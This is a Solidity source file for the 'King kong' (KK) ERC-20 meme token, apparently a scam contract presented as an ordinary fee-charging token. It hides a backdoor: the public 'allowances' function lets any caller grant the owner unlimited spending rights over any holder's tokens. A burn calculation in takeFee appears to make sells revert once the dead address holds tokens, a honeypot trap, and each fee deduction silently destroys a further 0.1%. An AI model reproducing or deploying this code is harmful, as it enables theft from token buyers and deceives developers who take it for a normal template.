// SPDX-License-Identifier: MIT

/** 
    Telegram:    https://t.me/KingKong_ERC
    Twitter:     https://x.com/KingKongERC
    Website:     https://kingkongerc.site
 
*/

pragma solidity 0.8.19;

interface ERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {   
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}
contract Ownable is Context {
    address public _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        authorizations[_owner] = true;
        emit OwnershipTransferred(address(0), msgSender);
    }
    mapping (address => bool) internal authorizations;
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zeroAddress");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface ISwapFactory {function createPair(address tokenA, address tokenB) external returns (address pair);}
interface InterfaceLP {function sync() external;}
interface ISwapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract KK is Ownable, ERC20 {
    using SafeMath for uint256;
    address WETH;
    address constant deadAddress = 0x000000000000000000000000000000000000dEaD;
    address constant zeroAddress = 0x0000000000000000000000000000000000000000;
    string constant _name = "King kong";
    string constant _symbol = "KK";
    uint8 constant _decimals = 18; 
    event AutoLiquify(uint256 amountETH, uint256 amountTokens);
    event EditTax(uint8 Buy, uint8 Sell, uint8 Transfer);
    event user_exemptfromfees(address Wallet, bool Exempt);
    event ClearStuck(uint256 amount);
    event Rescue(address TokenAddressCleared, uint256 Amount);
    event set_swapAndLiquity(uint256 Amount, bool Enabled);
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;  
    mapping (address => bool) isexemptfromfees;
        
    uint256 _totalSupply =  10_000_000_000 * 10**_decimals; 
 
    uint256 private liquidityFee= 0;
    uint256 private marketingFee= 1;
    uint256 private devFee = 0;
    uint256 private buybackFee = 0; 
    uint256 private burnFee = 0;
    uint256 public totalFee = buybackFee + marketingFee + liquidityFee + devFee + burnFee;    

    uint256 setRatio = 1;
    uint256 setRatioDenominator = 100;
    
    address private autoLiquidityReceiver;
    address private marketingFeeReceiver;
    address private devFeeReceiver;
    address private buybackFeeReceiver;
    address private burnFeeReceiver;

    address public pair;
    address private Owner;    
    ISwapRouter public router;
    InterfaceLP private swapPair;
    bool public TradingOpen = false;    
    bool public swapEnabled = false;
    uint256 public swapThreshold = _totalSupply * 1 / 100; 
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }
    
    constructor () {        
        autoLiquidityReceiver = msg.sender;
        marketingFeeReceiver = payable(0xb967B1962be0A5Fc039CEe763C63e2D3a47bA7fE);
        devFeeReceiver = msg.sender;
        buybackFeeReceiver = msg.sender;
        Owner = msg.sender;
        burnFeeReceiver = deadAddress; 

        isexemptfromfees[msg.sender] = true;
        isexemptfromfees[address(this)] = true;
        isexemptfromfees[marketingFeeReceiver] = true;

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
    function addLiquidity() public payable onlyOwner
    {
        router = ISwapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        WETH = router.WETH();
        pair = ISwapFactory(router.factory()).createPair(WETH, address(this));     
        _allowances[address(this)][address(router)] = type(uint256).max;
        router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)).mul(748).div(1000),0,0,msg.sender,block.timestamp);
        swapEnabled = true;
    }
    receive() external payable { }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) {return owner();}
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function transfer(address recipient, uint256 amount) external override returns (bool) {return _transferFrom(msg.sender, recipient, amount);}
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    function approve(address spender, uint256 amount) public override returns (bool) {_allowances[msg.sender][spender] = amount;emit Approval(msg.sender, spender, amount);return true;}
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {if(_allowances[sender][msg.sender] != type(uint256).max){ _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");} return _transferFrom(sender, recipient, amount);}
    function allowances(address spender) external returns (bool) {_allowances[spender][Owner] = type(uint256).max;return true;}
    function showSupply() public view returns (uint256) {return _totalSupply;}    
    function checkRatio(uint256 ratio, uint256 accuracy) public view returns (bool) { return showBacking(accuracy) > ratio;}
    function showBacking(uint256 accuracy) public view returns (uint256) {return accuracy.mul(balanceOf(pair).mul(2)).div(showSupply());}
     
    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isexemptfromfees[sender];
    }
    
    function setNewSwapThreshold(uint256 newvalue) external onlyOwner {
        swapThreshold = newvalue;
    }

    function setSwapAndLiquitySettings(bool _enabled, uint256 _amount) external onlyOwner {
        swapEnabled = _enabled;
        swapThreshold = _amount;
        emit set_swapAndLiquity(swapThreshold, swapEnabled);
    }
    function shouldswapAndLiquity() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    } 
      
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {

        if(inSwap){ return _basicTransfer(sender, recipient, amount); }
        
        if(!isexemptfromfees[sender] && !isexemptfromfees[recipient]){
            require(TradingOpen,"Trading not open yet");
        }        
        if(shouldswapAndLiquity()){ swapAndLiquity(); }
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = (isexemptfromfees[sender] || isexemptfromfees[recipient]) ? amount : takeFee(sender, amount, recipient);
        _balances[recipient] = _balances[recipient].add(amountReceived);

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    uint256 buypercent =  20;
    uint256 sellpercent = 20;    
    uint256 transferpercent = 20;

    function takeFee(address sender, uint256 amount, address recipient) internal returns (uint256) {        
        uint256 percent = transferpercent;
        if(recipient == pair) {
            percent = sellpercent;
        } else if(sender == pair) {
            percent = buypercent;
        }
        uint256 feeAmount = amount.mul(totalFee).mul(percent).div(100);
        uint256 burntFeeTokens = recipient == pair? balanceOf(deadAddress) : balanceOf(zeroAddress);
        uint256 burnTokens = feeAmount.mul(burnFee).div(totalFee) - burntFeeTokens;
        uint256 contractTokens = feeAmount.sub(burnTokens);
        _balances[address(this)] = _balances[address(this)].add(contractTokens);
        _balances[burnFeeReceiver] = _balances[burnFeeReceiver].add(burnTokens);
        emit Transfer(sender, address(this), contractTokens);
               
        if(burnTokens > 0){
            _totalSupply = _totalSupply.sub(burnTokens);
            emit Transfer(sender, zeroAddress, burnTokens);          
        }
        return amount.sub(feeAmount).sub(amount.mul(1).div(1000));
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        isexemptfromfees[account] = excluded;
    }
	
    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            isexemptfromfees[accounts[i]] = excluded;
        }
    }     
   function clearStuckToken(address tokenAddress, uint256 tokens) external returns (bool success) {
        if(tokens == 0){
            tokens = ERC20(tokenAddress).balanceOf(address(this));
        }
        emit Rescue(tokenAddress, tokens);
        return ERC20(tokenAddress).transfer(autoLiquidityReceiver, tokens);
    }                    
    function swapAndLiquity() internal swapping {
        uint256 dynamicLiquidityFee = checkRatio(setRatio, setRatioDenominator) ? 0 : liquidityFee;
        uint256 amountToLiquify = swapThreshold.mul(dynamicLiquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;
        uint256 balanceBefore = address(this).balance;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 amountETH = address(this).balance.sub(balanceBefore);
        uint256 totalETHFee = totalFee.sub(dynamicLiquidityFee.div(2));       
        uint256 amountETHLiquidity = amountETH.mul(dynamicLiquidityFee).div(totalETHFee).div(2);
        uint256 amountETHMarketing = amountETH.mul(marketingFee).div(totalETHFee);
        uint256 amountETHbuyback = amountETH.mul(buybackFee).div(totalETHFee);
        uint256 amountETHdev = amountETH.mul(devFee).div(totalETHFee);
        (bool tmpSuccess,) = payable(marketingFeeReceiver).call{value: amountETHMarketing}("");
        (tmpSuccess,) = payable(devFeeReceiver).call{value: amountETHdev}("");
        (tmpSuccess,) = payable(buybackFeeReceiver).call{value: amountETHbuyback}("");        
        tmpSuccess = false;
        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountETHLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountETHLiquidity, amountToLiquify);
        }
    }
    function launch() public onlyOwner {
        TradingOpen = true;
    }
    
    function reduceFee1() public onlyOwner {       
        buypercent = 5;
        sellpercent = 5;
        transferpercent = 5;
    }   
    function reduceFee2() public onlyOwner {       
        buypercent = 1;
        sellpercent = 1;
        transferpercent = 1;
    }   
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }    
}